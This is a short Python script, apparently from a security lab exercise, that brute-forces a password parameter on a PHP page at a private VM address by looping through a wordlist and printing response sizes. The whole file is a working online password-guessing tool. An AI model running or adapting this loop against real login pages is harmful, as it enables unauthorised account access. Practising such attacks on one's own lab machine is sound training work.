#!/usr/bin/python
# Brute Force web URL

import requests

passwords = open('passwords', 'r')

#replace IP with the IP of your Ubuntu VM...
base_url = "http://172.16.0.193/brute2.php?password="
end_url = "&Enter=Enter"

for password in passwords:
  password = password.rstrip()
  url = base_url + password + end_url
  try:
    r = requests.get(url)
    if r.status_code == 200:
      result_len = len(r.content)
      print("Password: " + password  + "\tResponse size = " + str(result_len))	

  except:
    pass
